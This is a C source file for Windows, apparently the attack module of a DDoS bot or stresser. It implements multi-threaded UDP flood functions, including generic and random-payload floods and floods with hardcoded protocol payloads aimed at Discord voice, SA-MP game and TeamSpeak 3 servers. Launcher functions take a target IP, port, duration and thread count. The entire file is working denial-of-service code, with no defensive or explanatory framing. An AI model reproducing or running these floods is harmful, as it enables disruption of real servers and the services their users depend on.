#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include <stdio.h>
#include <ws2tcpip.h>
#include <string.h>
#include <stdint.h>

#include "attacks.h"
#include "rand.h"

#pragma comment(lib, "ws2_32.lib")

#define SAMP_BUFFER 11
#define TS3_BUFFER 34
#define DISCORD_BUFFER_SIZE 48

typedef struct {
    char *payload;
    size_t length;
} custom_payload_t;

DWORD WINAPI udp_thread(LPVOID arg);
DWORD WINAPI udp_pps_thread(LPVOID arg);
DWORD WINAPI udp_discord_thread(LPVOID arg);
DWORD WINAPI udp_samp_thread(LPVOID arg);
DWORD WINAPI udp_ts3_thread(LPVOID arg);
DWORD WINAPI nudp_thread(LPVOID arg);
DWORD WINAPI udp_custom_thread(LPVOID arg);
DWORD WINAPI udp_payload_thread(LPVOID arg);

int get_random_port() {
    return (rand() % (65535 - 1024 + 1)) + 1024;
}

DWORD WINAPI udp_thread(LPVOID arg) {
    attack_args *args = (attack_args *)arg;
    
    SOCKET sock;
    struct sockaddr_in target_addr;
    char buffer[1024];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == INVALID_SOCKET) {
        free(args);
        return 0;
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    target_addr.sin_addr.s_addr = inet_addr(args->target);

    memset(buffer, 0xff, sizeof(buffer));

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < args->time) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }

    closesocket(sock);
    free(args);
    return 0;
}

DWORD WINAPI udp_pps_thread(LPVOID arg) {
    attack_args *args = (attack_args *)arg;
    
    SOCKET sock;
    struct sockaddr_in target_addr;
    char *buffer;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == INVALID_SOCKET) {
        free(args);
        return 0;
    }

    buffer = (char *)malloc(args->packet_size);
    if(buffer == NULL) {
        closesocket(sock);
        free(args);
        return 0;
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    target_addr.sin_addr.s_addr = inet_addr(args->target);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < args->time) {
        for(int i = 0; i < args->packet_size; i++) {
            buffer[i] = rand() % 255;
        }
        
        sendto(sock, buffer, args->packet_size, 0, 
               (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    free(buffer);

    closesocket(sock);
    free(args);
    return 0;
}

DWORD WINAPI udp_discord_thread(LPVOID arg) {
    attack_args *args = (attack_args *)arg;
    
    SOCKET sock;
    struct sockaddr_in local_addr, remote_addr;
    char buffer[DISCORD_BUFFER_SIZE];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == INVALID_SOCKET) {
        free(args);
        return 0;
    }

    int random_port = get_random_port();
    memset(&local_addr, 0, sizeof(local_addr));
    local_addr.sin_family = AF_INET;
    local_addr.sin_port = htons(random_port);
    local_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr*)&local_addr, sizeof(local_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        free(args);
        return 0;
    }

    memset(&remote_addr, 0, sizeof(remote_addr));
    remote_addr.sin_family = AF_INET;
    remote_addr.sin_port = htons(args->port);
    remote_addr.sin_addr.s_addr = inet_addr(args->target);

    char payload[48] = "\x90\xF8\x51\x9D\xB9\x73\xE0\x5F\x00\x03\x61\xB2\xBE\xDE\x00\x02\x57\x7F\x7A\xA5\x15\xE6\xEA\x8F\x36\x23\xFC\x34\xFA\xAE\x17\x00\xAB\x36\x42\x51\x65\x7F\x34\xB0\xDE\x0C\x6A\x00\x00\x00\x80";
    memcpy(buffer, payload, sizeof(payload));

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < args->time) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&remote_addr, sizeof(remote_addr));
    }

    closesocket(sock);
    free(args);
    return 0;
}

DWORD WINAPI udp_samp_thread(LPVOID arg) {
    attack_args *args = (attack_args *)arg;
    
    SOCKET sock;
    struct sockaddr_in local_addr, remote_addr;
    char buffer[SAMP_BUFFER];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == INVALID_SOCKET) {
        free(args);
        return 0;
    }

    int random_port = get_random_port();
    memset(&local_addr, 0, sizeof(local_addr));
    local_addr.sin_family = AF_INET;
    local_addr.sin_port = htons(random_port);
    local_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr*)&local_addr, sizeof(local_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        free(args);
        return 0;
    }

    memset(&remote_addr, 0, sizeof(remote_addr));
    remote_addr.sin_family = AF_INET;
    remote_addr.sin_port = htons(args->port);
    remote_addr.sin_addr.s_addr = inet_addr(args->target);

    char payload[11] = "\x53\x41\x4D\x50\x67\xE6\x79\x5F\x13\xA1\x63";
    memcpy(buffer, payload, sizeof(payload));

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < args->time) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&remote_addr, sizeof(remote_addr));
    }

    closesocket(sock);
    free(args);
    return 0;
}

DWORD WINAPI udp_ts3_thread(LPVOID arg) {
    attack_args *args = (attack_args *)arg;
    
    SOCKET sock;
    struct sockaddr_in local_addr, remote_addr;
    char buffer[TS3_BUFFER];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == INVALID_SOCKET) {
        free(args);
        return 0;
    }

    int random_port = get_random_port();
    memset(&local_addr, 0, sizeof(local_addr));
    local_addr.sin_family = AF_INET;
    local_addr.sin_port = htons(random_port);
    local_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr*)&local_addr, sizeof(local_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        free(args);
        return 0;
    }

    memset(&remote_addr, 0, sizeof(remote_addr));
    remote_addr.sin_family = AF_INET;
    remote_addr.sin_port = htons(args->port);
    remote_addr.sin_addr.s_addr = inet_addr(args->target);

    char payload[34] = "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x0a\x39\x7b\x0f\x00\x62\x18\xfa\xa2\xa4\x98\x74\xf9\x00\x00\x00\x00\x00\x00\x00\x00";
    memcpy(buffer, payload, sizeof(payload));

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < args->time) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&remote_addr, sizeof(remote_addr));
    }

    closesocket(sock);
    free(args);
    return 0;
}

DWORD WINAPI nudp_thread(LPVOID arg) {
    attack_args *args = (attack_args *)arg;
    
    SOCKET sock;
    struct sockaddr_in target_addr;
    char *buffer;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == INVALID_SOCKET) {
        free(args);
        return 0;
    }

    buffer = (char *)malloc(args->packet_size);
    if(buffer == NULL) {
        closesocket(sock);
        free(args);
        return 0;
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    target_addr.sin_addr.s_addr = inet_addr(args->target);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < args->time) {
        for(int i = 0; i < args->packet_size; i++) {
            buffer[i] = rand() % 255;
        }
        
        sendto(sock, buffer, args->packet_size, 0, 
               (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    free(buffer);
    closesocket(sock);
    free(args);
    return 0;
}

DWORD WINAPI udp_custom_thread(LPVOID arg) {
    attack_args *args = (attack_args *)arg;
    custom_payload_t *payload = (custom_payload_t *)args->extra;
    
    SOCKET sock;
    struct sockaddr_in target_addr;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == INVALID_SOCKET) {
        free(payload->payload);
        free(payload);
        free(args);
        return 0;
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    target_addr.sin_addr.s_addr = inet_addr(args->target);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < args->time) {
        sendto(sock, payload->payload, payload->length, 0, 
               (struct sockaddr*)&target_addr, sizeof(target_addr));
        Sleep(10);
    }

    closesocket(sock);
    free(payload->payload);
    free(payload);
    free(args);
    return 0;
}

DWORD WINAPI udp_payload_thread(LPVOID arg) {
    attack_args *args = (attack_args *)arg;
    custom_payload_t *payload = (custom_payload_t *)args->extra;
    
    SOCKET sock;
    struct sockaddr_in target_addr;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == INVALID_SOCKET) {
        free(payload->payload);
        free(payload);
        free(args);
        return 0;
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->port);
    target_addr.sin_addr.s_addr = inet_addr(args->target);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < args->time) {
        sendto(sock, payload->payload, payload->length, 0, 
               (struct sockaddr*)&target_addr, sizeof(target_addr));
        Sleep(10);
    }

    closesocket(sock);
    free(payload->payload);
    free(payload);
    free(args);
    return 0;
}

void udp_attack(char *target_ip, int target_port, int duration, int threads) {
    HANDLE thread_handles[100];
    int i;

    for(i = 0; i < threads; i++) {
        attack_args *args = (attack_args *)malloc(sizeof(attack_args));
        args->target = target_ip;
        args->port = target_port;
        args->time = duration;

        thread_handles[i] = CreateThread(NULL, 0, udp_thread, args, 0, NULL);
        if(thread_handles[i] == NULL) {
            printf("Failed to create thread %d\n", i);
            free(args);
            continue;
        }
        Sleep(100);
    }

    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for(i = 0; i < threads; i++) {
        if(thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
}

void udp_pps_attack(char *target, int port, int time, int packet_size, int threads) {
    HANDLE thread_handles[100];
    int i;

    for(i = 0; i < threads; i++) {
        attack_args *args = (attack_args *)malloc(sizeof(attack_args));
        args->target = target;
        args->port = port;
        args->time = time;
        args->packet_size = packet_size;

        thread_handles[i] = CreateThread(NULL, 0, udp_pps_thread, args, 0, NULL);
        if(thread_handles[i] == NULL) {
            printf("Failed to create thread %d\n", i);
            free(args);
            continue;
        }
        Sleep(100);
    }

    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for(i = 0; i < threads; i++) {
        if(thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
}

void udp_discord_attack(char *target_ip, int target_port, int duration, int threads) {
    HANDLE thread_handles[100];
    int i;

    for(i = 0; i < threads; i++) {
        attack_args *args = (attack_args *)malloc(sizeof(attack_args));
        args->target = target_ip;
        args->port = target_port;
        args->time = duration;

        thread_handles[i] = CreateThread(NULL, 0, udp_discord_thread, args, 0, NULL);
        if(thread_handles[i] == NULL) {
            printf("Failed to create thread %d\n", i);
            free(args);
            continue;
        }
        Sleep(100);
    }

    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for(i = 0; i < threads; i++) {
        if(thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
}

void udp_samp_attack(char *target_ip, int target_port, int duration, int threads) {
    HANDLE thread_handles[100];
    int i;

    for(i = 0; i < threads; i++) {
        attack_args *args = (attack_args *)malloc(sizeof(attack_args));
        args->target = target_ip;
        args->port = target_port;
        args->time = duration;

        thread_handles[i] = CreateThread(NULL, 0, udp_samp_thread, args, 0, NULL);
        if(thread_handles[i] == NULL) {
            printf("Failed to create thread %d\n", i);
            free(args);
            continue;
        }
        Sleep(100);
    }

    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for(i = 0; i < threads; i++) {
        if(thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
}

void udp_ts3_attack(char *target_ip, int target_port, int duration, int threads) {
    HANDLE thread_handles[100];
    int i;

    for(i = 0; i < threads; i++) {
        attack_args *args = (attack_args *)malloc(sizeof(attack_args));
        args->target = target_ip;
        args->port = target_port;
        args->time = duration;

        thread_handles[i] = CreateThread(NULL, 0, udp_ts3_thread, args, 0, NULL);
        if(thread_handles[i] == NULL) {
            printf("Failed to create thread %d\n", i);
            free(args);
            continue;
        }
        Sleep(100);
    }

    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for(i = 0; i < threads; i++) {
        if(thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
}

void nudp_attack(char *target, int port, int time, int packet_size, int threads) {
    HANDLE thread_handles[100];
    int i;

    for(i = 0; i < threads; i++) {
        attack_args *args = (attack_args *)malloc(sizeof(attack_args));
        args->target = target;
        args->port = port;
        args->time = time;
        args->packet_size = packet_size;

        thread_handles[i] = CreateThread(NULL, 0, nudp_thread, args, 0, NULL);
        if(thread_handles[i] == NULL) {
            printf("Failed to create thread %d\n", i);
            free(args);
            continue;
        }
        Sleep(100);
    }

    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for(i = 0; i < threads; i++) {
        if(thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
}

void udp_custom_attack(char *target, int port, int duration, char *payload, 
                      size_t payload_len, int threads) {
    HANDLE thread_handles[100];
    int i;

    for(i = 0; i < threads; i++) {
        attack_args *args = malloc(sizeof(attack_args));
        custom_payload_t *custom_payload = malloc(sizeof(custom_payload_t));
        
        custom_payload->payload = malloc(payload_len);
        memcpy(custom_payload->payload, payload, payload_len);
        custom_payload->length = payload_len;

        args->target = target;
        args->port = port;
        args->time = duration;
        args->extra = custom_payload;

        thread_handles[i] = CreateThread(NULL, 0, udp_custom_thread, args, 0, NULL);
        if(thread_handles[i] == NULL) {
            free(custom_payload->payload);
            free(custom_payload);
            free(args);
            continue;
        }
        Sleep(100);
    }

    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for(i = 0; i < threads; i++) {
        if(thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
}

void udp_payload_attack(char *target, int port, int duration, 
                       char *payload, size_t payload_len, int threads) {
    HANDLE thread_handles[100];
    int i;

    for(i = 0; i < threads; i++) {
        attack_args *args = malloc(sizeof(attack_args));
        custom_payload_t *custom_payload = malloc(sizeof(custom_payload_t));
        
        custom_payload->payload = malloc(payload_len);
        memcpy(custom_payload->payload, payload, payload_len);
        custom_payload->length = payload_len;

        args->target = target;
        args->port = port;
        args->time = duration;
        args->extra = custom_payload;

        thread_handles[i] = CreateThread(NULL, 0, udp_payload_thread, args, 0, NULL);
        if(thread_handles[i] == NULL) {
            free(custom_payload->payload);
            free(custom_payload);
            free(args);
            continue;
        }
        Sleep(100);
    }

    WaitForMultipleObjects(threads, thread_handles, TRUE, INFINITE);

    for(i = 0; i < threads; i++) {
        if(thread_handles[i] != NULL) {
            CloseHandle(thread_handles[i]);
        }
    }
}
